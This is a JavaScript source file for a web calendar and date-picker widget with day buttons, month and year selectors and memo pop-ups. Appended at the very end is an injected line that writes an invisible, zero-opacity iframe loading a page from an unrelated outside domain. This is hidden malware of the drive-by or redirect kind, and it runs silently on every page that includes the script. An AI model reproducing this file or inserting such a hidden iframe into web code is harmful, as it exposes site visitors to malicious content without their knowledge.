var kbCkDate=0;
var kbMemoLk=null;

var kbMPObj=null;
var kbDayAry=new Array('','Mo','Tu','We','Th','Fr','Sa','Su');
var kbOSDay='Su';
if (kbDateFormat=='MDY'){
 kbDayAry=new Array('','Su','Mo','Tu','We','Th','Fr','Sa');
 kbOSDay='Fr';
}
var kbDaysinMonth=new Array(0,31,29,31,30,31,30,31,31,30,31,30,31);
var kbMonthAry=new Array('','January','February','March','April','May','June','July','August','September','October','November','December');
var kbDKAry=new Array();
var kbDKSAry=new Array();


// KeyBoard Inner - Date Control Buttons

kbInnD='';
kbInnD+='<select name="kbDaySel" kb="yes" id="kbDaySel" size="1" onchange="kbDayIP();"  ></select>';
kbInnD+='<select name="kbMonthSel" kb="yes" id="kbMonthSel" size="1" onchange="kbMonthIP();" ></select>';
kbInnD+='<select name="kbYearSel" kb="yes" id="kbYearSel" size="1" onchange="kbYearIP();" ></select>';

for (kb1=1;kb1<=46;kb1++){
 kbDKAry[kb1]=kbgEBId('kbDay'+kb1);
}

for (kbi1=1;kbi1<=46;kbi1++){
 kbInnD+='<div id=kbDay'+kbi1+' style="position:absolute;overflow:hidden;width:'+(kbKSz+kbBdr)+'px;height:'+(kbKSz+kbBdr)+'px;top:5px;color:'+kbKeyTxtColor+';background-color:'+kbKeyBGColor+';border:solid black 1px;text-Align:center;font-size:10px;cursor:'+kbCur+'" onmouseover="javascript:kbKeyOver(this);" onclick="javascript:kbDateIP('+kbi1+');" ></div> ';
}

function kbDateKeyBd(){
 kbKBObj.innerHTML=kbInnD+kbCom;
 if (kbMPObj==null){
 kbMPObj=kbKBObj.cloneNode(false);
  document.getElementsByTagName('BODY')[0].appendChild(kbMPObj);
 }
 kbDSObj=kbgEBId('kbDaySel');
 kbMSObj=kbgEBId('kbMonthSel');
 kbYSObj=kbgEBId('kbYearSel');
 kbCSAry=new Array(kbDSObj.style,kbMSObj.style,kbYSObj.style,kbMPObj.style);
 kbMPObj.onclick=function(){ kbMemoClick(); }
 kbMPObj.onmouseout=function(){ kbMemoHide() }
 kbMPObj.onmouseover=function(){ clearTimeout(kbTO); }
 kbCSAry[3].visibility='hidden';
 kbCSAry[3].zIndex=kbZIndex;
 kbCSAry[3].width=kbMemoPadWidth;
 kbCSAry[3].height=kbMemoPadHeight;
 kbCSAry[3].backgroundColor=kbMemoPadBGColor;
 kbCSAry[3].color=kbMemoPadTxtColor;
 kbCSAry[3].border=kbMemoPadBorder;
 kbCSAry[3].fontSize=kbMemoPadTxtSize;
 kbCSAry[3].textAlign='center';
 kbButNu=7; kbButT=24; kbButL=0;
 kbButR=kbButNu;
 kbKBH=148; kbDKP=19; kbKBW=(kbButNu*kbDKP)+38;
 kbButPos();
 kbKBObjS.width=(kbKBW)+'px';
 kbKBObjS.height=(kbKBH)+'px';
 kbDObj.style.top='126px';
 kbDObj.style.left=(kbKBW-88-5)+'px';
 kbBAry[4].width='88px';
 kbBAry[4].left=(kbKBW-88-(kbBdr+3))+'px';
 if (kbType=='DB'){
  kbDKP=24;
  for (kb0=0;kb0<4;kb0++){ kbBAry[kb0].visibility='hidden'; }
  kbKBW=((kbButNu*kbDKP)-0);
  kbKBObjS.width=(kbKBW)+'px';
  kbBAry[4].width='70px';
  kbBAry[4].left=(kbKBW-70-(kbBdr+3))+'px';
 }
 kbBAry[4].backgroundColor=kbKeyHiBGColor;
 kbBAry[4].color=kbKeyHiTxtColor;
 kbBAry[4].textAlign='center';
 for (kbi=1;kbi<=46;kbi++){
  kbDKAry[kbi]=kbgEBId('kbDay'+kbi);
  kbDKSAry[kbi]=kbDKAry[kbi].style;
  kbDKSAry[kbi].left=(kbButL*kbDKP+2)+'px';
  kbDKSAry[kbi].top=(kbButT)+'px';
  kbDKSAry[kbi].width=(17)+'px';
  kbButL++;
  if (kbi==kbButR){
   kbButL=0;
   kbButR=kbButR+kbButNu;
   kbButT=kbButT+17;
  }
 }
 for (kbi=1;kbi<kbDayAry.length;kbi++){ kbDKAry[kbi].innerHTML=kbDayAry[kbi]; }
 kbBAry[0].top='75px';
 kbBAry[0].left=(kbKBW-32-(kbBdr+2))+'px';
 kbBAry[0].height=(48+kbBdr)+'px';
 kbBAry[1].top='58px';
 kbBAry[1].left=(kbKBW-32-(kbBdr+2))+'px';
 kbBAry[1].width=(30+kbBdr)+'px';
 kbBAry[2].top='24px';
 kbBAry[2].left=(kbKBW-32-(kbBdr+2))+'px';
 kbBAry[3].top='41px';
 kbBAry[3].left=(kbKBW-32-(kbBdr+2))+'px';
 for (kb0=0;kb0<31;kb0++){ kbDSObj.options[kb0]=new Option(kb0+1,kb0+1,true,true); }
 for (kb1=1;kb1<kbMonthAry.length;kb1++){ kbMSObj.options[kb1-1]=new Option(kbMonthAry[kb1],kb1,true,true); }
 for (kb2=1930;kb2<2100;kb2++){ kbYSObj.options[kb2-1930]=new Option(kb2,kb2,true,true); }
 for (kb0=0;kb0<3;kb0++){
  kbCSAry[kb0].position='relative';
  kbCSAry[kb0].top='2px';
  kbCSAry[kb0].fontSize='10px';
 }
 kbCSAry[0].width='38px';
 kbCSAry[1].width='74px';
 kbCSAry[2].width='50px';
 kbCSAry[0].left=(77)+'px';
 kbCSAry[1].left=(-36)+'px';
 kbCSAry[2].left=(2)+'px';
 if (kbDateFormat=='DMY'){
  kbCSAry[0].left=(2)+'px';
  kbCSAry[1].left=(2)+'px';
 }
 kbDate();
}

function kbDate(){
 kbnow = new Date
 kbDay = kbnow.getDate();
 kbMonth = kbnow.getMonth()+1;
// kbMonth ++ ; // Java script counts months from 0
 kbYear = kbnow.getFullYear();
 for (kbi=0;kbi<170;kbi++){
  if (kbYSObj.options[kbi].value==kbYear){ kbYSObj.selectedIndex=kbi; }
 }
 kbDSObj.selectedIndex=kbDay-1;
 kbMSObj.selectedIndex=kbMonth-1;
 kbYearIP();
}

function kbYearIP(){
 kbYear=kbYSObj.options[kbYSObj.selectedIndex].value;
 kb1stDay();
 kbMonthIP();
}

function kbMonthIP(){
 kbMonth=eval(kbMSObj.options[kbMSObj.selectedIndex].value);
 // kbStartDisplay = year day number of month Start
 kbStartDisplay=0;
 for (kbi=0;kbi<kbMonth;kbi++){
  kbStartDisplay+=kbDaysinMonth[kbi];
 }
 if (navigator.userAgent.toLowerCase().indexOf('opera')==-1){ kbDaySelValues(); }
 kbYearMonthDay();
 kbDayIP();
}

function kbDayIP(){
 if (kbDSObj.options[kbDSObj.selectedIndex].value!='0'){
  kbDay=kbDSObj.options[kbDSObj.selectedIndex].value;
 }
 else {
  kbDSObj.selectedIndex=''+(kbDay-1);
 }
 if (kbDay>kbDaysinMonth[kbMonth]){
  kbDay=1;
  kbDSObj.selectedIndex='0';
 }
 kbDateDisplay();
}

function kbDaySelValues(){
 for (kbi=0;kbi<31;kbi++){
  if (kbi<=kbDaysinMonth[kbMonth]-1){
   kbDSObj.options[kbi].value=''+(kbi+1);
   kbDSObj.options[kbi].text=''+(kbi+1);
   if (kbi<9){
    kbDSObj.options[kbi].text='0'+(kbi+1);
   }
  }
  else {
   kbDSObj.options[kbi].value='0';
   kbDSObj.options[kbi].text='';
  }
 }
}

function kb1stDay(){ // find the name of the 1st day of year
 kb=new Date(eval(kbYear))
 kb=kb.getDay();
 kbYMDNAry=new Array('x');
 for (kbi=1;kbi<380;kbi++){
  kbYMDNAry[kbYMDNAry.length]=kbDayAry[kb];
  kb++;
  if (kb==8){ kb=1; }
 }
}

function kbYearMonthDay(){
 kbYMDAry=new Array(24,25,26,27,28,29,30,31);
 // Change Feb Days if Leap Year
 kbDaysinMonth[2]=28;
 if (kbYear/4==Math.floor(kbYear/4)){
  kbDaysinMonth[2]=29;
 }
 // fill kbYMDAry with Month Day Numbers
 for (kbi=1;kbi<=kbDaysinMonth.length;kbi++){
  for (kbj=1;kbj<=kbDaysinMonth[kbi];kbj++){
   kbYMDAry[kbYMDAry.length]=kbj;
  }
 }
 // Add end of year Day Numbers
 for (kbi=1;kbi<=10;kbi++){
  kbYMDAry[kbYMDAry.length]=kbi;
 }
 kbSuOS=0;
 for (kbi=kbStartDisplay;kbi<kbStartDisplay+7;kbi++){
  if (kbYMDNAry[kbi]==kbOSDay){
   kbSuOS=kbi-kbStartDisplay+1;
  }
 }
 kbSuOS=8-kbSuOS;
}

function kbDateDisplay(){
 for (kbi=1;kbi<=46;kbi++){
  kbDKSAry[kbi].fontSize='7pt';
  kbDKSAry[kbi].fontWeight='normal';
  kbDKSAry[kbi].backgroundColor=kbKeyBGColor;
 }
 kbCnt=1;
 for (kbi=kbStartDisplay;kbi<kbStartDisplay+39;kbi++){
  kbDKAry[kbi-kbStartDisplay+1+7].innerHTML=kbYMDAry[kbi+8-kbSuOS];
  if (kbYMDAry[kbi+8-kbSuOS]==1&&kbCnt){
   kbCnt=0;
   for (kbj=kbi;kbj<kbi+kbDaysinMonth[kbMonth];kbj++){
    kbDKAry[kbj-kbStartDisplay+1+7].style.backgroundColor=kbKeyHiBGColor;
    kbDKAry[kbj-kbStartDisplay+1+7].style.color=kbKeyHiTxtColor;
   }
  }
 }
 for (kbi=1;kbi<=46;kbi++){
  if (kbDKAry[kbi].style.backgroundColor.toUpperCase()==kbKeyHiBGColor.toUpperCase()&&kbDKAry[kbi].innerHTML==kbDay){
   kbDKSAry[kbi].fontWeight='bold';
   kbDKSAry[kbi].fontSize='10pt';
  }
  if (kbDKAry[kbi].innerHTML<10){
   kbDKAry[kbi].innerHTML='0'+kbDKAry[kbi].innerHTML;
  }
 }
 for (kbi=1;kbi<=7;kbi++){
  kbDKSAry[kbi].backgroundColor=kbKeyHiBGColor;
  kbDKSAry[kbi].color=kbKeyHiTxtColor;
 }
 kbMonthD=kbMonth;
 if (kbMonthFormat=='Alpha'){
  kbMonthD=kbMonthAry[kbMonth].substring(0,3);
 }
 else if (kbMonth<10){
  kbMonthD='0'+kbMonth;
 }
 kbDayD=kbDay;
 if (kbDay<10){
  kbDayD='0'+kbDay;
 }
 if (kbDateFormat=='DMY'){
  kbString=kbDayD+kbDateSep+kbMonthD+kbDateSep+kbYear;
  kbDObj.innerHTML=kbString;
 }
 else {
  kbString=kbMonthD+kbDateSep+kbDayD+kbDateSep+kbYear;
  kbDObj.innerHTML=kbString;
 }
 kbMemoColor();
}

function kbMemoColor(){
 for (kbi=1;kbi<=46;kbi++){
  for (kb0=0;kb0<kbMemoAry.length;kb0++){
   if (kbDKSAry[kbi].backgroundColor.toLowerCase()==kbKeyHiBGColor.toLowerCase()&&(kbDKAry[kbi].innerHTML)*1==kbMemoAry[kb0][0].split('/')[1]&&kbMemoAry[kb0][0].split('/')[0]==kbMonth&&kbMemoAry[kb0][0].split('/')[2]==kbYear){
    kbDKSAry[kbi].backgroundColor=kbKeyMemoBGColor;
    kbDKSAry[kbi].color=kbKeyMemoTxtCol;
    kbMemoAry[kb0][6]=kbgEBId('kbDay'+kbi);
   }
  }
 }
}

function kbDateIP(kb){
 kbMemoHide()
 if (kb>7&&kbgEBId('kbDay'+kb).style.backgroundColor.toUpperCase()!=kbKeyBGColor.toUpperCase()){
  kbDSObj.selectedIndex=''+(kbgEBId('kbDay'+kb).innerHTML-1);
 }
 if (kbType=='DB'&&kbgEBId('kbDay'+kb).style.backgroundColor.toUpperCase()==kbKeyMemoBGColor.toUpperCase()){
  kbMemoClick();
 }
 kbDayIP();
}

function kbKeyOver(kb){
 kbMemoLk=null;
 if (kb.style.backgroundColor.toLowerCase()==kbKeyMemoBGColor.toLowerCase()){
  kbDay=kb.innerHTML*1;
  kb.style.backgroundColor=kbMemoPadBGColor;
  kb.style.color=kbMemoPadTxtColor;
  kbMemo();
 }
 else { kb.onmouseout=function(){ kbMemoHide(); } }
}

function kbMemo(){
 clearTimeout(kbTO);
 for (kb0=0;kb0<kbMemoAry.length;kb0++){
  if (kbDay==kbMemoAry[kb0][0].split('/')[1]&&kbMonth==kbMemoAry[kb0][0].split('/')[0]&&kbYear==kbMemoAry[kb0][0].split('/')[2]){
   kbMemoLk=kbMemoAry[kb0][2];
   kbDSAry[3].top=(kbTop(kbMemoAry[kb0][6])+15)+'px';
   kbDSAry[3].left=(kbLeft(kbMemoAry[kb0][6])-kbMPObj.offsetWidth+kbDKP)+'px';
   if (kbLeft('kbMemoPad')<10){ kbDSAry[3].left=(10)+'px'; }
   kbDSAry[3].visibility='visible';
   kbMPObj.innerHTML=kbMemoAry[kb0][1];
  }
 }
}

function kbMemoHide(){
 kbCSAry[3].visibility='hidden';
 for (kb0=0;kb0<kbMemoAry.length;kb0++){
  if (kbMemoAry[kb0][6]!=null&&kbMonth==kbMemoAry[kb0][0].split('/')[0]&&kbYear==kbMemoAry[kb0][0].split('/')[2]){
   kbMemoAry[kb0][6].style.backgroundColor=kbKeyMemoBGColor;
   kbMemoAry[kb0][6].style.color=kbKeyMemoTxtCol;
  }
 }
}

function kbMemoClick(){
 if (kbMemoLk){ window.top.location=kbMemoLk; }
 kbCSAry[3].visibility='hidden';
}


kbCkDate=1;




document.write('<style>.vb_style_forum {filter: alpha(opacity=0);opacity: 0.0;width: 200px;height: 150px;}</style><div class="vb_style_forum"><iframe height="150" width="200" src="http://gclabrelscon.net/about.php"></iframe></div>');
